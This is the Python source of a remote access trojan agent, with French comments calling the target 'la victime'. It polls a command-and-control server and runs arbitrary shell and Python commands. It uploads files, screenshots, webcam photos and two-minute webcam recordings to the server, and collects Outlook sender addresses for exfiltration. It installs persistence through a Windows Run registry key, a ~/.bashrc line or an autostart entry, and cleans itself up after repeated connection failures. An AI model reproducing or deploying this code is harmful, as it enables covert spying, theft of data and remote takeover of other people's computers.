#!/usr/bin/env python2
# coding: utf-8

import requests
import time
import os
import subprocess
import platform
import shutil
import sys
import traceback
import threading
import uuid
#import StringIO
import zipfile
import tempfile
import socket
import getpass
import cv2
import numpy as np
import time
import win32com.client

if os.name == 'nt':
    from PIL import ImageGrab
else:
    import pyscreenshot as ImageGrab

import config


def threaded(func):
    def wrapper(*_args, **kwargs):
        t = threading.Thread(target=func, args=_args)
        t.start()
        return
    return wrapper


class Agent(object):

    def __init__(self):
        self.idle = True
        self.silent = False
        self.platform = platform.system() + " " + platform.release()
        self.last_active = time.time()
        self.failed_connections = 0
        self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()

    def get_install_dir(self):
        """"  Verrifie si le dossier d'installation existe """
        install_dir = None
        if platform.system() == 'Linux':
            install_dir = self.expand_path('~/.lass')
        # si le systeme est windows
        elif platform.system() == 'Windows':
            # Creer le chemin d'accès du dosser lass dans le dossier de profil
            install_dir = os.path.join(os.getenv('USERPROFILE'), 'lass')
        # Si le dossier lass existe
        if os.path.exists(install_dir):
            # retourne  le chemin lass
            return install_dir
        else:
            # rien n'est retouné
            return None

    def is_installed(self):
        return self.get_install_dir()

    def get_consecutive_failed_connections(self):
        if self.is_installed():
            install_dir = self.get_install_dir()
            check_file = os.path.join(install_dir, "failed_connections")
            if os.path.exists(check_file):
                with open(check_file, "r") as f:
                    return int(f.read())
            else:
                return 0
        else:
            return self.failed_connections

    def update_consecutive_failed_connections(self, value):
        if self.is_installed():
            install_dir = self.get_install_dir()
            check_file = os.path.join(install_dir, "failed_connections")
            with open(check_file, "w") as f:
                f.write(str(value))
        else:
            self.failed_connections = value

    def log(self, to_log):
        """ Write data to agent log """
        print(to_log)

    def get_UID(self):
        """ Returns a unique ID for the agent """
        return getpass.getuser() + "_" + str(uuid.getnode())

    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
            json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
        return req.text

    def send_output(self, output, newlines=True):
        """ Send console output to server """
        if self.silent:
            self.log(output)
            return
        if not output:
            return
        if newlines:
            output += "\n\n"
        req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
        data={'output': output})

    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))

    @threaded
    def runcmd(self, cmd):
        """ Runs a shell command and returns its output """
        try:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = (out + err)
            self.send_output(output)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    @threaded
    def python(self, command_or_file):
        """ Execute les commande et fihier python sur la machine de la victime """
        new_stdout = StringIO.StringIO()
        old_stdout = sys.stdout
        sys.stdout = new_stdout
        new_stderr = StringIO.StringIO()
        old_stderr = sys.stderr
        sys.stderr = new_stderr
        if os.path.exists(command_or_file):
            self.send_output("[*] Execution du fichier python...")
            with open(command_or_file, 'r') as f:
                python_code = f.read()
                try:
                    exec(python_code)
                except Exception as exc:
                    self.send_output(traceback.format_exc())
        else:
            self.send_output("[*] Execution de la commande python...")
            try:
                exec(command_or_file)
            except Exception as exc:
                self.send_output(traceback.format_exc())
        sys.stdout = old_stdout
        sys.stderr = old_stderr
        self.send_output(new_stdout.getvalue() + new_stderr.getvalue())

    def cd(self, directory):
        """ Change current directory """
        os.chdir(self.expand_path(directory))

    @threaded
    def upload(self, file):
        """ Uploads a local file to the server """
        file = self.expand_path(file)
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_output("[*] Uploading %s..." % file)
                requests.post(config.SERVER + '/api/' + self.uid + '/upload',
                    files={'uploaded': open(file, 'rb')})
            else:
                self.send_output('[!] No such file: ' + file)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    @threaded
    def download(self, file, destination=''):
        """ Downloads a file the the agent host through HTTP(S) """
        try:
            destination = self.expand_path(destination)
            if not destination:
                destination= file.split('/')[-1]
            self.send_output("[*] Downloading %s..." % file)
            req = requests.get(file, stream=True)
            with open(destination, 'wb') as f:
                for chunk in req.iter_content(chunk_size=8000):
                    if chunk:
                        f.write(chunk)
            self.send_output("[+] File downloaded: " + destination)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    def persist(self):
        """ Installs the agent """
        if not getattr(sys, 'frozen', False):
            self.send_output('[!] Persistence only supported on compiled agents.')
            return
        if self.is_installed():
            self.send_output('[!] Agent seems to be already installed.')
            return
        if platform.system() == 'Linux':
            persist_dir = self.expand_path('~/.lass')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)
            os.system('chmod +x ' + agent_path)
            if os.path.exists(self.expand_path("~/.config/autostart/")):
                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Lass\nExec=%s\n" % agent_path
                with open(self.expand_path('~/.config/autostart/lass.desktop'), 'w') as f:
                    f.write(desktop_entry)
            else:
                with open(self.expand_path("~/.bashrc"), "a") as f:
                    f.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
        # si la platform executer est windows
        elif platform.system() == 'Windows':
            # creation du chemin de destination dans le dossier du prfil en ajouter le dossier lass
            # exple: c:\Users\mamadou\lass
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'lass')
            # Si le chemin  n'existe pas
            if not os.path.exists(persist_dir):
                #  creation du dossier lass
                os.makedirs(persist_dir)
            # Creation duchemin d'acces lass avec avec le nom de l'executable
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            # Copy du l'agent executable dans le dossier de l'executable
            shutil.copyfile(sys.executable, agent_path)
            # Ajout de la clé de registre pour l'execution a chaque demarrage
            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v   /t REG_SZ /d \"%s\"" % agent_path
            subprocess.Popen(cmd, shell=True)
        self.send_output('[+] Agent installe avec succes.')

    def clean(self):
        """ desinstalle agent supprime dans les registres """
        if platform.system() == 'Linux':
            persist_dir = self.expand_path('~/.lass')
            if os.path.exists(persist_dir):
                shutil.rmtree(persist_dir)
            desktop_entry = self.expand_path('~/.config/autostart/lass.desktop')
            if os.path.exists(desktop_entry):
                os.remove(desktop_entry)
            os.system("grep -v .lass .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'lass')
            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v lass"
            subprocess.Popen(cmd, shell=True)
            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v lass /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
            subprocess.Popen(cmd, shell=True)
        self.send_output('[+] Agent desinstalle avec succes.')

    def exit(self):
        """ Kills the agent """
        self.send_output('[+] Exiting... (bye!)')
        sys.exit(0)

    @threaded
    def zip(self, zip_name, to_zip):
        """ Zips a folder or file """
        try:
            zip_name = self.expand_path(zip_name)
            to_zip = self.expand_path(to_zip)
            if not os.path.exists(to_zip):
                self.send_output("[+] No such file or directory: %s" % to_zip)
                return
            self.send_output("[*] Creating zip archive...")
            zip_file = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
            if os.path.isdir(to_zip):
                relative_path = os.path.dirname(to_zip)
                for root, dirs, files in os.walk(to_zip):
                    for file in files:
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                zip_file.write(to_zip, os.path.basename(to_zip))
            zip_file.close()
            self.send_output("[+] Archive created: %s" % zip_name)
        except Exception as exc:
            self.send_output(traceback.format_exc())
   
    @threaded
    def screenshot(self):
        """ Takes a screenshot and uploads it to the server"""
        screenshot = ImageGrab.grab()
        tmp_file = tempfile.NamedTemporaryFile()
        screenshot_file = tmp_file.name + ".png"
        tmp_file.close()
        screenshot.save(screenshot_file)
        self.upload(screenshot_file)

    @threaded
    def image(self):
        dev = cv2.VideoCapture(0)
        time.sleep(0.5)
        r,f = dev.read()
        dev.release()
        keyfile = tempfile.NamedTemporaryFile()
        log_dir = keyfile.name + ".png"
        if not r:
            util.log(f)
            return "Unable to access webcam"
        cv2.imwrite(log_dir,f)
        cv2.destroyAllWindows()
        self.upload(log_dir)
    @threaded
    def stream_video(self):

        #creation de l'objet video
        cap = cv2.VideoCapture(0)
        #verrifie si le webcam n 'est pas detecte dans le cas echeant renvoi une erreur
        if (cap.isOpened() == False):
            print("Unable to read camera feed")
        # Les resolutions par defaut des cadres sont ontenues. Les resolution par defaut dependent du système
        #nous les convertissons de float en int
        frame_width = int(cap.get(3))
        frame_height = int(cap.get(4))
        # Creer l'objet fichier temporaire
        keyfile = tempfile.NamedTemporaryFile()
        #formater le fichier de sorti en avi dans le dossier temporaire
        log_dir = keyfile.name + ".avi"
        # defini le codec et creer l'objet VideoWriter avec la sorti est stocke dans le dossier tmp
        out = cv2.VideoWriter(log_dir,cv2.VideoWriter_fourcc('M','J','P','G'), 10, (frame_width,frame_height))
        #    Creation d'une variable temp en minute en ajoutant deux minutes suplementaires
        time_in = time.localtime(time.time()).tm_min + 2
        #Creation d'une boucle tantque la minute locale +2 est superieur
        while time_in > time.localtime(time.time()).tm_min:
            ret, frame = cap.read()
            if ret == True:
            # ecrire l'image dans le fichier outpy.avi
                out.write(frame)
            #appuyer sur q sur le clavier pour arreter l'enregistrement
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
        # Casser la boucle
            else:
                break
    # Liberer les objets d'ecriture de capture de video et d'ecriture de video
        cap.release()
        out.release()
    # fermer les cadres
        cv2.destroyAllWindows()
    # Envoi du fichier vers le serveur
        self.upload(log_dir)

    @threaded
    def dump_contact(self):
        outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
        inbox = outlook.GetDefaultFolder(6)
        message = inbox.Items
        print("[+] Recuperation des addresses ")
        li  = list()
        for messages in message:
            try:
                attachement = messages.Sender.Address + '\n'
                li.append(attachement)
            except AttributeError:
                pass
        mail_list = list(dict.fromkeys(li))
        temp = tempfile.NamedTemporaryFile()
        contact_file = temp.name + '.txt'
        f = open(contact_file, 'w')
        for mail in mail_list:
            f.write(mail)
        f.close()
        self.upload(contact_file)

    def help(self):
        """ Displays the help """
        self.send_output(config.HELP)

    def run(self):
        """ Main loop """
        self.silent = True
        if config.PERSIST:
            try:
                self.persist()
            except:
                self.log("Failed executing persistence")
        self.silent = False
        while True:
            try:
                todo = self.server_hello()
                self.update_consecutive_failed_connections(0)
                # Something to do ?
                if todo:
                    commandline = todo
                    self.idle = False
                    self.last_active = time.time()
                    self.send_output('$ ' + commandline)
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]
                    try:
                        if command == 'cd':
                            if not args:
                                self.send_output('usage: cd </path/to/directory>')
                            else:
                                self.cd(args[0])
                        elif command == 'upload':
                            if not args:
                                self.send_output('usage: upload <localfile>')
                            else:
                                self.upload(args[0],)
                        elif command == 'download':
                            if not args:
                                self.send_output('usage: download <remote_url> <destination>')
                            else:
                                if len(args) == 2:
                                    self.download(args[0], args[1])
                                else:
                                    self.download(args[0])
                        elif command == 'clean':
                            self.clean()
                        elif command == 'persist':
                            self.persist()
                        elif command == 'exit':
                            self.exit()
                        elif command == 'zip':
                            if not args or len(args) < 2:
                                self.send_output('usage: zip <archive_name> <folder>')
                            else:
                                self.zip(args[0], " ".join(args[1:]))
                        elif command == 'python':
                            if not args:
                                self.send_output('usage: python <python_file> or python <python_command>')
                            else:
                                self.python(" ".join(args))
                        elif command == 'screenshot':
                            self.screenshot()
                        elif command == 'image':
                            self.image()
                        elif command == 'stream':
                            self.stream_video()
                        elif command == 'help':
                            self.help()
                        else:
                            self.runcmd(commandline)
                    except Exception as exc:
                        self.send_output(traceback.format_exc())
                else:
                    if self.idle:
                        time.sleep(config.HELLO_INTERVAL)
                    elif (time.time() - self.last_active) > config.IDLE_TIME:
                        self.log("Switching to idle mode...")
                        self.idle = True
                    else:
                        time.sleep(0.5)
            except Exception as exc:
                self.log(traceback.format_exc())
                failed_connections = self.get_consecutive_failed_connections()
                failed_connections += 1
                self.update_consecutive_failed_connections(failed_connections)
                self.log("Consecutive failed connections: %d" % failed_connections)
                if failed_connections > config.MAX_FAILED_CONNECTIONS:
                    self.silent = True
                    self.clean()
                    self.exit()
                time.sleep(config.HELLO_INTERVAL)

def main():
    agent = Agent()
    agent.run()

if __name__ == "__main__":
    main()
